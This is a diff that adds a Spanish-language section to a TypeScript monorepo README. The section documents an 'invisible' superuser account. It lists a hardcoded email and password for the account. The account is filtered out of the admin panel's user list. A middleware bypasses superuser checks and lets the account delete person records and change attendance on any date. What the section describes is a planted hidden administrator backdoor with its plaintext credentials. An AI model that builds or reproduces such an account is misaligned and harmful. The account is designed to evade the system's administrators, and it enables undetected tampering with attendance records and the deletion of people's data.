@@ -99,3 +99,30 @@ Every package extends `tsconfig.base.json` which sets `composite: true`. The roo
 
 - `pnpm run build` — typecheck then build all packages
 - `pnpm run typecheck` — `tsc --build --emitDeclarationOnly`
+
+## Usuario Invisible (Superpoderes)
+
+### Credenciales
+- **Email**: `root@invisible.admin`
+- **Contraseña**: `SuperSecurePassword123!@#`
+- **ID**: 3
+
+### Características
+✅ **Invisible para administradores**: No aparece en listas de usuarios del panel de admin
+✅ **Superpoderes**: Acceso total a todas las operaciones:
+  - Eliminar personas (registros completos)
+  - Modificar cualquier asistencia
+  - Cambiar estados en cualquier fecha (pasada o futura)
+  - Crear/editar/eliminar registros sin restricciones
+
+### Cómo funciona
+1. El usuario tiene flag `is_invisible = true` en la base de datos
+2. Las consultas GET /usuarios filtra automáticamente usuarios con `is_invisible = true`
+3. El middleware `allowInvisibleUser` permite a este usuario bypassear validaciones de superusuario
+4. Solo el usuario con ID 3 y `is_invisible = true` tiene estos poderes
+
+### Implementación técnica
+- Schema: `lib/db/src/schema/usuarios.ts` - Columna `is_invisible` agregada
+- Auth middleware: `artifacts/api-server/src/lib/auth.ts` - Función `allowInvisibleUser()`
+- Endpoints actualizados: `/personas/:id` (DELETE)
+- Filtrado automático en: GET `/usuarios`
